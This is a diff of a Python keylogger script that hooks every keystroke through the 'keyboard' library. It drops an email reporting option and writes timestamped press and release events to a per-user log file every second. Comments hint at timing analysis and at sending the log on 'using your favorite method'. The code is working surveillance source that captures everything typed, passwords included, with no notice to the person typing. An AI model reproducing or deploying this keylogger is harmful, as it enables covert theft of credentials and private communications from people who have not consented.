@@ -2,20 +2,22 @@
 import keyboard # for keylogs
 from threading import Timer
 from datetime import datetime
+import os
 
-SEND_REPORT_EVERY = 5
+SEND_REPORT_EVERY = 1
 
 #time now printed.
 #reordered for "event, key, time"
 #still prints repeat characters at the end of the string but This
 #doesnt affect the time so it is ok - can remove it easily in the parser
 
+currentUser = 'oskar'
+
 class Keylogger:
     current_letter=''
 
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval):
         self.interval = interval
-        self.report_method = report_method
         # this is the string variable that contains the log of all
         # the keystrokes within `self.interval`
         self.log = ""
@@ -36,7 +38,7 @@ class Keylogger:
             # uppercase with []
             if name == "space":
                 # " " instead of "space"
-                name = " "
+                name = "space"
             elif name == "enter":
                 # add a new line whenever an ENTER is pressed
                 name = "[ENTER]\n"
@@ -46,30 +48,28 @@ class Keylogger:
                 # replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
-        print(f"current letter: {Keylogger.current_letter} ")
 
         if eventtype == "up":
-            name = "\n" + name + " " + str(now) + " Pressed"
+            name = name + " " + str(now) + " Released" + "\n"
         elif eventtype == "down" and Keylogger.current_letter != name:
             Keylogger.current_letter = name
-            print(f"name: {name}")
-            letter = name[0]
-            name = "\n" + name + " " + str(now) + " Released"
+            name = name + " " + str(now) + " Pressed" + "\n"
 
         # finally, add the key name to our global `self.log` variable
         self.log += name
 
 
     def report_to_file(self):
+        file_name = os.path.join('keylogs', f"{currentUser}.txt")
         """This method creates a log file in the current directory that contains
         the current keylogs in the `self.log` variable"""
-        self.filename = "keylog"
-        # open the file in write mode (create it)
-        myfile = open(f"{self.filename}.txt", "a")
+
         # write the keylogs to the file
+        myfile = open(file_name, "a")
+
         myfile.write(self.log)
-        print(f"[+] Saved {self.filename}.txt")
-    #    myfile.close()
+        print(f"[+] Saved logs for {currentUser}.txt")
+        # myfile.close()
 
 
 
@@ -104,9 +104,7 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
-    # if you want a keylogger to send to your email
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file
     # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
